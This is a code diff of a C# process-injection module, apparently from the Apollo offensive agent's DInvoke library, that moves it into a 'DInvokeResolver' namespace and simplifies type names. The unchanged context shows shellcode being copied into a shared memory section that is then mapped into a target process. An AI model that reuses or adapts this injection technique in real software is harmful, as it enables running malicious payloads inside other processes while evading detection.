@@ -3,9 +3,9 @@ using System.Linq;
 using System.Reflection;
 using System.Diagnostics;
 
-using DynamicInvoke = Apollo.Api.DInvoke.DynamicInvoke;
+using DynamicInvoke = DInvokeResolver.DInvoke.DynamicInvoke;
 
-namespace Apollo.Api.DInvoke.Injection
+namespace DInvokeResolver.DInvoke.Injection
 {
     /// <summary>
     /// Base class for allocation techniques.
@@ -37,9 +37,9 @@ namespace Apollo.Api.DInvoke.Injection
         /// <param name="Process">The target process.</param>
         /// <param name="Address">The address at which to allocate the payload in the target process.</param>
         /// <returns>True when allocation was successful. Otherwise, throws relevant exceptions.</returns>
-        public virtual IntPtr Allocate(PayloadType Payload, System.Diagnostics.Process Process, IntPtr Address)
+        public virtual IntPtr Allocate(PayloadType Payload, Process Process, IntPtr Address)
         {
-            Type[] funcPrototype = new Type[] { Payload.GetType(), typeof(System.Diagnostics.Process), Address.GetType() };
+            Type[] funcPrototype = new Type[] { Payload.GetType(), typeof(Process), Address.GetType() };
 
             try
             {
@@ -63,10 +63,10 @@ namespace Apollo.Api.DInvoke.Injection
         /// <param name="Payload">The payload to allocate to the target process.</param>
         /// <param name="Process">The target process.</param>
         /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
-        public virtual IntPtr Allocate(PayloadType Payload, System.Diagnostics.Process Process)
+        public virtual IntPtr Allocate(PayloadType Payload, Process Process)
         {
 
-            Type[] funcPrototype = new Type[] { Payload.GetType(), typeof(System.Diagnostics.Process) };
+            Type[] funcPrototype = new Type[] { Payload.GetType(), typeof(Process) };
 
             try
             {
@@ -145,7 +145,7 @@ namespace Apollo.Api.DInvoke.Injection
         /// <param name="Payload">The payload to allocate to the target process.</param>
         /// <param name="Process">The target process.</param>
         /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
-        public override IntPtr Allocate(PayloadType Payload, System.Diagnostics.Process Process)
+        public override IntPtr Allocate(PayloadType Payload, Process Process)
         {
             if (!IsSupportedPayloadType(Payload))
             {
@@ -162,7 +162,7 @@ namespace Apollo.Api.DInvoke.Injection
         /// <param name="Process">The target process.</param>
         /// <param name="PreferredAddress">The preferred address at which to allocate the payload in the target process.</param>
         /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
-        public IntPtr Allocate(PICPayload Payload, System.Diagnostics.Process Process, IntPtr PreferredAddress)
+        public IntPtr Allocate(PICPayload Payload, Process Process, IntPtr PreferredAddress)
         {
             // Get a convenient handle for the target process.
             IntPtr procHandle = Process.Handle;
@@ -171,14 +171,14 @@ namespace Apollo.Api.DInvoke.Injection
             IntPtr sectionAddress = CreateSection((uint)Payload.Payload.Length, sectionAttributes);
 
             // Map a view of the section into our current process with RW permissions
-            SectionDetails details = MapSection(System.Diagnostics.Process.GetCurrentProcess().Handle, sectionAddress,
+            SectionDetails details = MapSection(Process.GetCurrentProcess().Handle, sectionAddress,
                 localSectionPermissions, IntPtr.Zero, Convert.ToUInt32(Payload.Payload.Length));
 
             // Copy the shellcode to the local view
             System.Runtime.InteropServices.Marshal.Copy(Payload.Payload, 0, details.baseAddr, Payload.Payload.Length);
 
             // Now that we are done with the mapped view in our own process, unmap it
-            Data.Native.NTSTATUS result = UnmapSection(System.Diagnostics.Process.GetCurrentProcess().Handle, details.baseAddr);
+            Data.Native.NTSTATUS result = UnmapSection(Process.GetCurrentProcess().Handle, details.baseAddr);
 
             // Now, map a view of the section to other process. It should already hold the payload.
 
